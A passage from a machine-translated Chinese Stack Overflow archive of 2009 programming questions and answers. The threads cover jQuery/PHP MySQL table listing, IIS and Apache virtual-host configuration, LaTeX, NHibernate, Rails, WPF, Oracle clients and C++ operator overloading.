            var Password = 'None';
            var Database = 'None';

            $("#connect").click(function() {
                Server = $('#server').val();
                Username = $('#username').val();
                Password = $('#password').val();
                Database = $('#database').val();
                loadTables();
            });

            function loadTables() {
                $.get("display.php", { server: Server, username: Username, password: Password, database: Database, content: "tables" },
                    function(data){
                        html = "<ul>";
                        $(data).find("table").each(function() {
                            html = html + "<li>" + $(this).text() + "</li>";
                            });
                                            html = html + "</ul>";
                        $('#content').html(html);
                    }
                );
            }
        </script>
    </head>
    <body>
        <center>
            <div class='connection'>
                <form name='connectForm'>
                    Server: <input type='text' size='30' id='server' />&nbsp;
                    Username: <input type='text' id='username' />&nbsp;
                    Password: <input type='password' id='password' />&nbsp;
                    Database: <input type='text' id='database' />&nbsp;
                    <input type='button' id='connect' value='Connect' />
                </form>
            </div>
            <div id='content'>

            </div>
        </center>
    </body>
</html> 
```

**显示.php**

```
<?
mysql_connect($_GET['server'], $_GET['username'], $_GET['password'])
    or die("Error: Could not connect to database!<br />" . mysql_error());
mysql_select_db($_GET['database']);

$content = $_GET['content'];

if ($content == "tables") {
    $result = mysql_query("show tables");
    $xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
    $xml .= "<tables>";
    while ($row = mysql_fetch_assoc($result)) {
        $xml .= "<table>" . $row['Tables_in_blog'] . "</table>";
    }
    $xml .= "</tables>";
    header('Content-type: text/xml');
    echo $xml;
}
?> 
```

编辑：我已经根据几个答案的组合更新了代码，但我仍然遇到同样的问题。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-02-15T09:01:02.747

好的，首先**不要那样做，** “那个”我的意思是：

*   不要将数据库连接详细信息放在 Javascript 中；和
*   不要在未净化的情况下使用来自用户的输入。你只是要求被黑客入侵。

话虽如此，您的主要问题似乎是`$(#content)`应该是`$("#content")`. 在按钮上放置一个 onclick 并不是真正的 jQuery 方式。尝试：

```
<body>
<div class='connection'>
  <form name='connectForm'>
    Server: <input type='text' id="server" size='30' name='server' />
    Username: <input type='text' id="username" name='username' />
    Password: <input type='password' id="password" name='password' />
    Database: <input type='text' id="database" name='database' />
    <input type='button' id="connect" value='Connect' />
  </form>
</div>
<div id='content'></div>
<script type="text/javascript" src="/jquery-1.3.1.js"></script>
<script type="text/javascript">
$(function() {
  $("#connect").click(function() {
    $.get(
      "display.php",
      {
        server: $("#server").val(),
        username: $("#username").val(),
        password: $("#password").val(),
        database: $("#database").val(),
        content: "tables"
      },
      function(data) {
        $("#content").html("<ul></ul>");
        $(data).find("table").each(function() {
          $("#content ul").append("<li>" + $(this).text() + "</li>");
        });
      }
    );
  });
});
</script>
</body> 
```

**编辑：**对上述内容进行细微更正并使用此脚本进行测试：

```
<?
header('Content-Type: text/xml');
echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
?>
<root>
<?
$tables = array('one', 'two', 'three', 'four');
foreach ($tables as $table) {
    echo "  <table>$table</table>\n";
}
?>
</root> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T08:59:26.697

我希望这有帮助。我注意到关于您的代码的三件事：

1) display.php 不关闭标签。

2) 您使用 $(#content) 引用“内容”div，这会引发 Javascript 错误。确保将此选择器封装在引号中，例如 $('#content')。

3) 我不确定"$("table", xml).text()"。相反，使用非常酷的 find('tag').each() 语法来遍历 XML 响应。这对我有用，可以替代您的 function(data) 语句：

```
function(data) { 
    htmlTable = '<ul>';
    $(data).find('table').each(function(){ 
        htmlTable = htmlTable + '<li>' + $(this).text() + '</li>'; });
    htmlTable = htmlTable + '</ul>'
    $('#content').html(htmlTable);
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T09:16:23.147

这是一段工作代码：

```
<script type='text/javascript'>
  function connect() {
          $.ajax({
                url:'display.php',
                type: 'POST',
                dataType:'xml',
                success: { 
                    server: $('#server').val()||'None', 
                    username: $('#username').val()||'None', 
                    password: $('#password').val()||'None', 
                    database: $('#database').val()||'None', 
                    content: "tables" 
                  },
                  function(data){
                      $('#content').html('<ul></ul>');
                      var contentUL = $('#content>ul');
                      $(data).find('table').each(function(){
                        $('<li></li>').html($(this).html()).appendTo(contentUL);
                      });                                        
                  },
                  'xml'
                });
  }
</script>
</head>
<body>
  <center>
      <div class='connection'>
          <form id="connectForm" name='connectForm'>
                  Server: <input id="server" type='text' size='30' name='server' /> 
                  Username: <input id="username" type='text' name='username' /> 
                  Password: <input id="password" type='password' name='password' /> 
                  Database: <input id="database" type='text' name='database' /> 
                  <input type='button' onclick='connect();' value='Connect' />
          </form>
      </div>
      <div id='content'>          
      </div>
  </center>
</body> 
```

但在我看来，使用 JSON 而不是 xml 更好更容易，使用它更容易（get 函数的最后几行）：

```
 function(data){
                  $('#content').html('<ul></ul>');
                  var contentUL = $('#content>ul');
                  $.each(data.tables, function(){
                    $('<li></li>').html(this).appendTo(contentUL);
                  });                                        
              },
              'json'); 
```

您也可以使用 jquery.form 插件提交表单。它还可以使用响应更新指定的元素，例如：

```
$(document).ready(function() {
    $('#connectForm').ajaxForm({
        target: '#content'
    });
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-15T08:58:12.970

我不确定到底是什么问题。但是您不需要 $.get 回调中的 $(function() {}) - 将函数传递给 $() 实际上会将事件处理程序绑定到“就绪”事件，该事件仅在您的页面首次加载时被调用. 您只需提供一个将您的 XML 作为参数的函数（在这里您将其作为“数据”但将其引用为“xml”？）并使用它。我将从阅读[http://docs.jquery.com/Ajax/jQuery.get#urldatacallbacktype](http://docs.jquery.com/Ajax/jQuery.get#urldatacallbacktype)和[http://docs.jquery.com/Events/ready#fn](http://docs.jquery.com/Events/ready#fn)开始。此外，安装 Firebug 并检查错误控制台以查看您的 JavaScript 出现问题的位置 - 您可以转到“脚本”选项卡并设置断点以查看您的代码是如何执行的，以了解哪里出了问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-15T09:03:43.707

```
$(#content) // This is definitely a problem. 
```

选择器必须是字符串，所以`$("#content")`是正确的。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-15T09:05:32.720

您应该使用 jQuery.forms.js 插件。 [http://malsup.com/jquery/form/](http://malsup.com/jquery/form/)

# asp.net - 使用 IIS 6/7 重写 URL - 重写主机名 {HTTP_HOST}

> ID：550505
> 
> 赞同：7
> 
> 时间：2009-02-15T07:56:18.890
> 
> 标签：asp.net, iis

我需要为传入请求重写“主机名”{HTTP_HOST}。是否可以使用 IIS 7 重写模块来做到这一点？
我想将[http://abc.xyz.com/](http://abc.xyz.com/) * 重写为[http://xyz.com/sites/abc/](http://xyz.com/sites/abc/) *。这是针对在内部使用 {HTTP_HOST} 的 SharePoint 网站完成的。

是否有任何 Url Rewriters 可以让我更改 IIS 的 {HTTP_HOST} 变量？

亲切的问候，

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-10-08T21:45:01.790

您可以使用 IIS 7 URL Rewrite Module 2.0 更改 HTTP_HOST 服务器变量。有关如何执行此操作的更多信息，请参阅[设置 HTTP 请求标头和 IIS 服务器变量](http://learn.iis.net/page.aspx/686/setting-http-request-headers-and-iis-server-variables/)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-07-15T13:42:07.557

[IIRF](http://iirf.codeplex.com)是免费的，并且允许您重写标头，包括 HTTP_HOST。

> 我想将[http://abc.xyz.com/](http://abc.xyz.com/) * 重写为[http://xyz.com/sites/abc/](http://xyz.com/sites/abc/) *。这是针对在内部使用 {HTTP_HOST} 的 SharePoint 网站完成的。

您需要重写 Host 和 Url。这使它有点复杂。在这个规则集中，我分步进行，并使用新的标头来存储步骤之间的状态：

```
# detect whether we're using the abc host
RewriteCond     %{HTTP_HOST}          ^abc\.xyz\.com$
RewriteHeader   Host-Needs-Rewrite:   ^$                 YaHuh

# rewrite the Host: header to the alt host name if necessary
RewriteCond     %{HTTP_HOST_NEEDS_REWRITE}   ^YaHuh$
RewriteCond     %{HTTP_HOST}                 ^(?!xyz\.com)(.+)$
RewriteHeader   Host:          .*            xyz.com 

# rewrite the Url to the appropriate place
RewriteCond     %{HTTP_HOST_NEEDS_REWRITE}   ^YaHuh$
RewriteCond     %{HTTP_HOST}                 ^xyz\.com$
RewriteRule     /(.*)$                       /sites/abc/$1     [L] 
```

您也可以通配 abc 部分。像这样：

```
# detect whether we're using the abc host
RewriteCond     %{HTTP_HOST}          ^([^.]+)\.xyz\.com$
RewriteHeader   Host-Needs-Rewrite:   ^$                     %1

# rewrite the Host: header to the alt host name if necessary
RewriteCond     %{HTTP_HOST_NEEDS_REWRITE}   ^.+$
RewriteCond     %{HTTP_HOST}                 ^(?!xyz\.com)(.+)$
RewriteHeader   Host:          .*            xyz.com 

# rewrite the Url to the appropriate place
RewriteCond     %{HTTP_HOST_NEEDS_REWRITE}   ^(.+)$
RewriteCond     %{HTTP_HOST}                 ^xyz\.com$
RewriteRule     /(.*)$                       /sites/%1/$1     [L] 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T08:06:49.583

我不熟悉 IIS 7 重写模块，但[ISAPI_Rewrite](http://www.isapirewrite.com/)几乎可以更改您想要的任何 HTTP 标头。有一个免费版本对我们的网站来说已经足够了，对您的网站来说可能也足够了。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-23T19:00:27.763

是的，可以使用 IIS 7 重写模块。[您可以根据此博客文章](https://www.pluralsight.com/blog/it-ops/iis7-url-rewrite-extension-on-windows-server-2008)使用 GUI 在 IIS7 中设置重定向。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-15T09:05:23.077

如果您想避免重定向（根据您对 Evgeny 的评论），唯一的其他选择是 server.transfer。使用 server.transfer 处理被发送到服务器上的不同页面，客户端不知道（页面之间没有返回客户端的往返行程）。

除了 server.transfer 实际重定向是非常典型的 ISAPI_Rewrite 是一种流行的工具，并且正如 Evgeny 提到的那样工作得非常好。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-18T10:17:03.723

更新：这将执行重定向，而不是重置变量。我不会删除这个答案，因为我认为它很简洁，但它并不能完全回答你想要的

我为 Economist.com 以一种非常简单的方式做到了这一点

一个站点有两个 IIS 站点，它们共享同一个 webroot。主 IIS 网站保持原样侦听当前主机标头，例如

```
216.35.68.215 economist.com 
```

另一个 IIS 站点在输入其他主机标头的情况下侦听 IP 地址。

IE

```
216.35.68.215 economist.co.uk 
```

“主目录”中的第二个网络从站有一个重定向集，它将更正人们到达您网站的任何主机名

设置“上面输入的确切 URL”和“此资源的永久重定向”并输入您的完全限定主机名条目，如下所示

[http://www.economist.com](http://www.economist.com) $S$Q

$S$Q 将维护您输入的其他主机名上的所有 URL。

随意测试这个

[http://www.economist.co.uk/world/americas/](http://www.economist.co.uk/world/americas/)

只会推动你

[http://www.economist.com/world/americas/](http://www.economist.com/world/americas/)

这意味着您不必运行，至少出于这个原因，相当昂贵的 IIS 重写模块

# latex - LaTeX 中的超链接不正确

> ID：550508
> 
> 赞同：2
> 
> 时间：2009-02-15T08:01:52.153
> 
> 标签：latex, report, hyperlink, pdflatex, hyperref

到目前为止`hyperref`，LaTeX 中的包已自动正确链接我报告中的所有项目。但是有一个没有正确链接，可能是因为我手动将它添加到目录中，如下所示：

```
\addcontentsline{toc}{chapter}{Bibliography} 
```

我该如何解决？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-02-15T08:11:45.860

您必须`\phantomsection`在`\addtocontentsline`. 这指示`hyperref`在该点添加锚点。另外，请考虑到您必须多次运行 LaTeX 才能使该锚点位于准确的位置。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T10:52:39.670

如果您使用的是标准 LaTeX 文档类，例如`report`，您可以使用[tocbibind](http://www.ctan.org/tex-archive/macros/latex/contrib/tocbibind/)包，然后您将不需要该`\addcontentsline`命令并且超链接应该可以正常工作。从文档中：

> 该`tocbibind`软件包使目录、图表列表、表格列表、参考书目和索引的标题都可以添加到目录中。

我还建议查看[memoir](http://www.ctan.org/tex-archive/macros/latex/contrib/memoir/)课程，这也解决了这个问题。它旨在替代标准`report`和`book`类，并提供许多用于自定义的选项和命令。

# nhibernate - NHibernate Criteria API、预测和结果

> ID：550513
> 
> 赞同：1
> 
> 时间：2009-02-15T08:07:21.907
> 
> 标签：nhibernate, criteria, rhino

我有以下域对象：

```
public class Data
{
    public virtual int ID { get; set; }
    public virtual DateTime TimeStamp { get; set; }
    public virtual int Value { get; set; }

    public virtual Channel Channel { get; set; }       

} 
```

我正在使用来自 Rhino.Commons 的存储库。我需要在一段时间内为几个通道选择值的总和。这些值应按通道 ID 排序。我使用以下查询（在存储库方法中）：

```
var criteria = DetachedCriteria.For<LiveData>()
            .Add(Restrictions.Le("TimeStamp", startDate))
            .Add(Restrictions.Ge("TimeStamp", endDate))
            .Add(Restrictions.InG<Channel>("Channel", channels))
            .SetProjection(Projections.Sum("Value"))
            .SetProjection(Projections.GroupProperty("Channel"));

long[] result = ReportAll<long>(criteria, Projections.ProjectionList(), Order.Asc("Channel")); 
```

我在最后一行收到错误，因为此查询返回的不是长数字列表。它返回一个这样的对象列表（它适用于它）：

```
public class ResultValue
{
    public virtual Channel Channel { get; set;}
    public virtual int Value { get; set; }
    public ResultValue()
    {            
    }

    public ResultValue(int value, Channel channel)
    {
        this.Value = value;
        this.Channel = channel;
    }
} 
```

这是因为我已将 Projections.GroupProperty("Channel") 投影添加到标准以进行分组。有没有办法从结果集中删除一个投影（Projections.GroupProperty("Channel") from my sample）或添加没有投影的分组？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-15T14:49:14.127

这是一个[未决的 NHibernate 问题](http://216.121.112.228/browse/NH-1426)。

# ruby-on-rails - Rails 中的 x_sendfile 问题

> ID：550522
> 
> 赞同：1
> 
> 时间：2009-02-15T08:12:53.360
> 
> 标签：ruby-on-rails, x-sendfile

我对 John Guenin 的 x_sendfile ( [http://john.guen.in/past/2007/4/17/send_files_faster_with_xsendfile/](http://john.guen.in/past/2007/4/17/send_files_faster_with_xsendfile/) ) 有一些问题。

在对 PDF 文件的下载进行编码时，我使用以下代码：

```
def send_the_file(filename)
  xsendfile (“#{Rails.root}/doc/” + filename, :type => ‘application/pdf’)
end 
```

但我只下载了 1 个字节。如果文件名不是绝对的，通常会发生这种情况（因此添加了#{Rails.root}。我还检查了该文件是否具有必要的权限。这在本地主机和我的产品站点上都失败了。

任何想法我做错了什么？

TIA,

乌尔夫

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-16T04:04:59.923

你用的是什么版本的 Rails？如果您使用的是 2.1 或更高版本，X-Sendfile 选项内置在 Rails 的 send_file 方法中。

```
send_file 'filename', :x_sendfile => true 
```

否则，您确定 mod_xsendfile 已正确安装和配置吗？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T02:09:01.863

您可能需要确保您实际使用的是支持 xsendfile 的 Web 服务器。如果你是开发模式，你可能不是，它可能会失败。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-09-24T12:08:23.983

尝试在 apche httpd.conf 文件中设置 XSendFileAllowAbove 上

# apache - Apache 多个 VirtualDocumentRoot

> ID：550525
> 
> 赞同：14
> 
> 时间：2009-02-15T08:22:36.893
> 
> 标签：apache, apache2

在 Linux 系统上使用 Apache2 有没有办法使用[mod_vhost_alias](http://httpd.apache.org/docs/2.0/mod/mod_vhost_alias.html)拥有多个 VirtualDocumentRoot ？

这是我目前正在使用并希望继续使用的命名约定：

```
host                    directory
127.0.0.1 domain        domain.com
127.0.0.1 sub.domain    domain.com_sub 
```

然后在 httpd.conf 的 vhosts 部分中，我有：

```
NameVirtualHost 127.0.0.1

<VirtualHost 127.0.0.1>
    VirtualDocumentRoot /var/www/%0.0.com
</VirtualHost>

<VirtualHost 127.0.0.1>
    VirtualDocumentRoot /var/www/%2.0.com_%1
</VirtualHost> 
```

问题是当我访问 sub.domain 时，Apache 错误日志显示它正在寻找 /var/www/sub.domain.com 而不是 /var/www/domain.com_test 这让我相信它只读取第一条规则然后失败，但我想做的是使用任何满足两个 VirtualDocumentRoot 规则中的任何一个的文档根。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-02-15T09:16:48.590

Apache 通常会选择与HTTP 标头中提供的主机`ServerName`名`ServerAlias`匹配的第一个虚拟主机。`Host`在您的情况下，由于您没有`ServerName`指令，因此 Apache 应该使用 IP 地址上的反向 DNS 查找来伪造服务器名称，并假设反向 DNS 导致 domain.com 不匹配，然后 Apache 默认为第一个虚拟主机。听起来很复杂，我知道...底线是，您应该使用`ServerName`并`ServerAlias`明确配置。尝试更多类似的东西：

```
NameVirtualHost 127.0.0.1
<VirtualHost 127.0.0.1>
    ServerName domain.com
    ServerAlias www.domain.com
    VirtualDocumentRoot /var/www/%0
</VirtualHost>
<VirtualHost 127.0.0.1>
    ServerName sub.domain.com
    ServerAlias *.domain.com
    VirtualDocumentRoot /var/www/%2.%3_%1
</VirtualHost> 
```

这应该`/var/www/domain.com`用于[http://domain.com](http://domain.com)和[http://www.domain.com](http://www.domain.com)`/var/www/www.domain.com`，这两者都由第一个虚拟主机提供服务，对于[http://sub.domain.com](http://sub.domain.com)，用于[http:// blah.domain.com](http://blah.domain.com)等等。`/var/www/sub.domain.com``/var/www/blah.domain.com`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2010-07-30T05:23:27.620

当你想放一个“。”时，你必须限定反向引用。在文件路径中。所以你需要这样：

```
VirtualDocumentRoot /var/www/%2.0.%3_%1 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2010-03-24T07:26:30.420

关于 OP 和设置“/var/www/html”的问题：

我遇到的问题是使用 %1 而不是 %2。这是我的工作示例：

```
ServerAlias www.*.org.au
UseCanonicalName Off
VirtualDocumentRoot /path/to/sites/%2/pub 
```

希望对某人有所帮助！

[我在mod_vhost_alias docs](http://httpd.apache.org/docs/2.0/mod/mod_vhost_alias.html)中阅读了有关“目录名称插值”的文档。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-06-01T13:05:52.930

我终于找到了一个允许灵活创建子域的配置。

请参阅[mod_vhost_alias上的 apache 文档](http://httpd.apache.org/docs/2.4/mod/mod_vhost_alias.html)

如果您的根开发域有 3 个部分，例如 dev.example.com，您可以将`%-4+`其用作根域之前所有内容的占位符。如果它有 4 个部分，请使用`%-5+`.

```
<VirtualHost *:80>
    VirtualDocumentRoot "/var/www/%-4+/webroot"
    ServerName www.dev.example.com
    ServerAlias *.dev.example.com
    php_admin_value auto_prepend_file /var/www/setdocroot.php
</VirtualHost> 
```

这样，您可以创建一个名为的目录`/var/www/sub.domain/webroot`并使用 url 访问它`sub.domain.dev.example.com`。

该行`php_admin_value auto_prepend_file /var/www/setdocroot.php`修复了某些系统（如 OSX 10.9+）上的 docroot

以下是 的内容`setdocroot.php`：

```
<?php
$_SERVER['DOCUMENT_ROOT'] = str_replace($_SERVER['SCRIPT_NAME'], '', $_SERVER['SCRIPT_FILENAME']);
?> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-02-16T17:28:00.997

我注意到这个配置是 $_SERVER['DOCUMENT_ROOT'] 指向 /var/www/html 而不是虚拟主机的文档根目录。诡异的。

更新（2010-07-24）：

我刚刚写了一篇博客文章如何设置您的 http 证明服务器 [http://www.devcha.com/2010/07/how-to-setup-your-http-proof-server.html](http://www.devcha.com/2010/07/how-to-setup-your-http-proof-server.html)

# escaping - 转义 TeX 方程中的字符？

> ID：550526
> 
> 赞同：6
> 
> 时间：2009-02-15T08:23:30.947
> 
> 标签：escaping, tex, equation

我想在 TeX 方程中使用包含破折号的变量名。但是，破折号被解释为减号。有人知道如何逃脱角色吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-02-15T08:29:02.697

使用 \textrm{-} 不起作用？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T08:33:43.357

将整个变量名放在 \text 中。

或者更好的是，为使用 \text 的变量名创建一个宏。使用宏将帮助您获得统一的样式，以后可以轻松更改。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-06-17T09:28:35.403

在 TeX 方程中输入 \hbox{-}。它的编译速度比 \text{-} 快。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-12-03T06:37:56.717

推杆

> `\catcode`\-=11`

因为等式范围内的第一个声明将`-`变成一个普通的字母字符。

# wpf - 如何在 WPF 中显示多层控件？

> ID：550536
> 
> 赞同：2
> 
> 时间：2009-02-15T08:37:31.087
> 
> 标签：wpf, .net-3.5

我正在尝试学习 WPF，到目前为止我很喜欢它。但是，缺少一些东西或者我不明白的东西。我们如何在 WPF 中显示多层控件？随附的屏幕截图很好地说明了我正在尝试做的事情。我有一个窗口，我想在上面显示其他东西。我怎样才能做到这一点？

[![截屏](https://i.stack.imgur.com/mf5C9.png)](https://i.stack.imgur.com/mf5C9.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-15T09:26:30.703

将两个元素放在 Grid 中的同一行/列中只会覆盖它们。然后，您可以使用每个元素的可见性来显示/隐藏它们。例如：

```
<Grid>
    ... row/column definitions
    <Grid Grid.Row="0" Grid.Column="0">
        ... main content here
    </Grid>
    <Grid Grid.Row="0" Grid.Column="0" x:Name="grid2">
        ... overlaid content here
    </Grid>
</Grid> 
```

现在覆盖的内容将出现在主要内容内容的顶部。将 grid2.Visibility 设置为 Visible/Hidden 将显示/隐藏您的叠加内容。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T10:22:43.580

我可以想到两种方法来实现这种效果（在窗口顶部延伸到窗口边界后面的非矩形半透明覆盖）。

第一个选项，不要在生产代码中使用它（AllowTransparency 很慢而且非常错误） - 使窗口大于实际内容，设置 AllowsTransaprencey="True" 以便窗口“外部”区域是透明的，现在全部对于弹出窗口，您要做的就是在与“窗口”相同的容器中添加另一个视觉对象。

第二个选项，使用弹出窗口，您必须仔细定位弹出窗口，通过互操作调用 SetWindowRgn 使其非矩形，并调用设置透明度值的 Win32 API 函数（对不起，暂时不记得名称）它是半透明的。

第一个选项很容易实现，并且看起来比第二个选项更好，但是速度较慢，并且您会遇到各种奇怪的错误（包括某些显示驱动程序的崩溃）-我从经验中知道这一点，当我切换软件时，我从 AllowTransparency 到 SetWindowRgn 销售 90% 的美眉报告消失了。

第二个选项需要大量本机 Win32 API 调用，但它应该可以工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T08:45:22.113

我自己对 WPF 了解不多，但是[Panel.ZIndex](http://msdn.microsoft.com/en-us/library/system.windows.controls.panel.zindex.aspx)附加属性是您所追求的吗？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-15T13:38:12.033

你可以使用[装饰层](http://msdn.microsoft.com/en-us/library/ms743737.aspx)来覆盖。它基本上是一个覆盖任何装饰元素的渲染表面。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-15T09:34:21.947

您可以通过在网格中叠加事物来实现类似的效果（如果它们在同一个单元格中，它们只会堆叠在一起），但我的蜘蛛感觉会告诉我，这只是另一个定义的窗口，例如：

```
<Window
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="SubWindow" Height="100" Width="100" WindowStyle="None" AllowsTransparency="True" Opacity="0.5"  > 
```

然后，您可以通过执行以下操作在主窗口中显示它：

```
SubWindow sw = new SubWindow ();
sw.DoModal(); 
```

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2009-02-15T09:03:33.567

不确定您到底要完成什么，但从我与 WPF 的短暂接触来看，您似乎可以通过正确配置两个窗口之间的父\子关系来完成所需的工作。我最近在 Dobb 博士的门户网站上做了一个基本的“你好，世界”，这可能会给你一些方向。

这是培训教程视频的链接[——Dobb 博士的电视](http://www.ddj.com/ddjtvlounge.jhtml)，您只需从列表中选择“构建标准 WPF 应用程序”视频...

# php - 如何在 php 中显示文件夹文件名（包括韩文名称）？

> ID：550539
> 
> 赞同：2
> 
> 时间：2009-02-15T08:41:02.527
> 
> 标签：php

有没有机会在文件夹中显示文件名？它还会支持韩文、中文和其他语言名称吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T09:31:54.653

目前这个问题也存在一个[未解决的错误。](http://bugs.php.net/bug.php?id=30195)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T09:26:59.000

您必须使用字符编码来支持您的文件名所具有的字符的输出。我建议您使用[UTF-8](http://en.wikipedia.org/wiki/UTF-8)，因为它可以编码任何[Unicode 字符](http://en.wikipedia.org/wiki/Universal_Character_Set)。

所以试试这个：

```
// set the MIME type and character encoding
header('Content-Type: text/html;charset=utf-8');

$files = glob('*');
foreach ($files as $file) {
    echo $file, '<br>';
} 
```

# .net - Oracle 客户端 x32 和 x64 共存

> ID：550543
> 
> 赞同：3
> 
> 时间：2009-02-15T08:51:59.397
> 
> 标签：.net, asp.net, oracle, odp.net

我的客户有一个 x64 服务器，他在其中安装了 x32 和 x64 版本的 Oracle 客户端。在他安装了我的 Web 应用程序并尝试运行它后，他得到“试图以不正确的格式加载程序 (HRESULT 0x8007000B)”关于 Oracle.DataAccess.dll 的异常

他的 IIS 配置为 64 位。

我事件要求他在 Web 配置中的 Oracle.DataAccess.dll 上添加带有 processorArchitecture="amd64" 属性的 << assemblyBinding>> 重定向，但它没有帮助。

如何强制我的应用程序/他的 IIS/他的服务器选择正确的 Oracle 客户端版本？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-18T20:23:31.660

显然 32 位和 64 位的 Oracle 安装程序无法相互识别，因此如果您先安装 32 位版本，然后再安装 64 位版本，则默认情况下 64 位版本将安装到与 32 位版本相同的目录中。这不好。解决方案是删除两个客户端，然后将 32 位安装到一个目录，将 64 位安装到另一个目录。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-15T15:15:45.060

您是否尝试将 IIS 进程的 PATH 环境变量设置为仅包含 64 位二进制文​​件？

这在许多方面都不是一个令人愉快的解决方案（尤其是对于服务和托管运行时，如 IIS），但如果它有效，它会给您一些可供考虑的选项。

# visual-studio - 如何知道程序集是私有的还是公共的

> ID：550544
> 
> 赞同：1
> 
> 时间：2009-02-15T08:53:18.037
> 
> 标签：visual-studio, assemblies, private

我有一个程序集（它是一个 DLL）我想知道它是私有的还是公共的？我该怎么做，它存在一个程序来做到这一点？或者 Visual Studio 可以告诉你？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-15T13:24:34.093

我假设您指[的是 Private Assemblies 的独立应用程序概念](http://msdn.microsoft.com/en-us/library/aa375674.aspx)。在这种情况下，程序集需要一个清单（基本上表明其版本），并且可能位于某个本地文件夹或并排缓存（SxS 文件夹）中。检测清单将是 dll 是私有的合理指示（尽管我认为这不是 100% 的测试，它可能足以满足您的需求）

私有程序集的概念与.Net 并不真正相关，因为只需将 dll 放在应用程序[私有 bin 路径](http://msdn.microsoft.com/en-us/library/system.appdomainsetup.privatebinpath.aspx)上的某个任意文件夹中就足够了，在这种情况下，程序集没有什么特别之处。

有 GAC 的概念，大致类似于非托管 dll 的 SxS 缓存。那里的任何程序集都将更*容易*访问，但适用于类、方法、成员的公共/私有概念绝不适用于程序集。

作为最后一点，您可能（尽管我不相信您是）正在考虑“[朋友](http://msdn.microsoft.com/en-us/library/0tke9fxk.aspx)”组装概念。这可以通过程序集级别的[InternalsVisibleTo](http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.internalsvisibletoattribute.aspx)属性或类型级别的[StrongNameIdentityPermission来完成。](http://msdn.microsoft.com/en-us/library/system.security.permissions.strongnameidentitypermission.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-15T08:59:55.370

不幸的是，我认为没有*很好*的方法来解决这个问题。我知道的最好的方法是使用[反射器](http://www.red-gate.com/products/reflector/)来查看程序集的反编译版本。

希望有帮助，伊恩

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T09:00:33.340

你的意思是一个程序集是私有的还是公共的？也许您的意思是功能是私有的还是公共的？

但我想你可以试试[Reflector](http://reflector.red-gate.com)。

# c++ - operator>= 重载的奇怪行为

> ID：550548
> 
> 赞同：2
> 
> 时间：2009-02-15T08:59:18.413
> 
> 标签：c++, operator-overloading, overload-resolution

我在 C++ 中使用运算符重载时有一个奇怪的行为。我有一堂课，我需要检查它的内容是否大于或等于 long double。我重载了 >= 运算符来进行这个检查，我的声明如下：

```
bool MyClass::operator>=(long double value) const; 
```

我不得不说，我的班级也有一个 cast-to-long-double 运算符，它仅在某些条件下无例外地工作。现在，当我使用此运算符时，编译器抱怨 operator>= 的使用不明确，替代方法是：

*   矿。
*   内置的`operator>=(long double, int)`.

现在，我如何强制程序使用我的运算符？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-15T09:10:08.480

**2015 更新：**或者，如果您想使用`(double)obj`语法而不是语法来保持转换能力，请通过在其前面加上该关键字来`obj.to_double()`创建转换功能。`explicit`然后您需要显式转换才能触发转换。就个人而言，我更喜欢这种`.to_double`语法，除非转换是 to，`bool`因为在这种情况下，`if(obj)`即使它是`explicit`，也会使用转换，这比`if(obj.to_bool())`我认为的可读性要高得多。

* * *

删除转换运算符。一路上都会惹来麻烦。有一个像

```
to_double() 
```

或类似的返回双精度值并显式调用该函数以获得双精度值。

对于手头的问题，有这个问题：

```
obj >= 10 
```

